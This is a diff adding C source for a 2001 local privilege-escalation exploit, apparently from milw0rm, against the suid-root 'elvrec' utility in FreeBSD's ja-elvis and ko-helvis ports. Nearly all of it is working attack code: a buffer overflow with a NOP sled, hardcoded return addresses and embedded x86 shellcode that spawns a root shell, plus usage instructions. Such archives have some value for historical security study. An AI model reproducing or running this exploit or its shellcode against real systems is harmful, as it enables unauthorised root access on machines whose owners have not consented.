@@ -1,0 +1,58 @@
+/*
+ * ja-elvis & ko-helvis - FreeBSD 3.5.1 & 4.2 ports package local root exploit
+ *
+ * vulnerable: versions prior to ja-elvis-1.8.4_1 and ko-helvis-1.8h2_1
+ * 
+ * The above two packages contain a file recovery utility 'elvrec', installed
+ * suid root(4755) by default. The utility is subject to a buffer overflow 
+ * leading to root privileges:
+ *
+ * Usage: ./elvwreck <offset> <alignment>
+ * 
+ * dethy@synnergy.net // www.synnergy.net
+ * 28 Feb 2001.
+ *
+ */ 
+
+#include <stdio.h>
+#include <stdlib.h>
+#define PROG	"/usr/local/bin/elvrec"
+#define VULN	608
+#define BSIZE	1024
+#define NOP	0x90
+#define ESP	0xbfbff92c	// FreeBSD 4.2
+#define OFFSET	0
+#define EATME	1		// byte alignment
+
+char shellcode[]= 
+  "\xeb\x37\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\x36\x89\x76"
+  "\x04\x89\x76\x08\x83\x06\x10\x83\x46\x04\x18\x83\x46\x08\x1b"
+  "\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x1d\x50\x56\xff"
+  "\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x01\x07\x07\xe8\xc4\xff"
+  "\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02"
+  "\x02\x02\x02/bin/sh.-c.sh";
+
+int main(int argc, char *argv[]) {
+  char buffer[BSIZE];
+  long address=ESP;
+  int i, offset, align;
+
+  if(argc > 1) { offset = atoi(argv[1]); align = atoi(argv[2]); } 
+  else { offset = OFFSET; align = EATME; }
+
+  address += offset;
+  fprintf(stderr, "\n* using ret %#x -> align %d -> offset %d\n\n", address, align, offset); 
+
+  for(i=align; i<VULN; i+=4){ *(long *)&buffer[i] = address; }
+  for(i=VULN; i<(BSIZE - strlen(shellcode) - 100); i++){ buffer[i] = NOP; }
+  memcpy(buffer+i, shellcode, strlen(shellcode));
+  buffer[BSIZE] = '\0';
+
+  if(execlp(PROG, "elvrec", buffer, 0)) {
+    fprintf(stderr, "Unable to execute %s\n\n", PROG);
+    exit(1);
+  }
+}
+
+
+// milw0rm.com [2001-03-03]
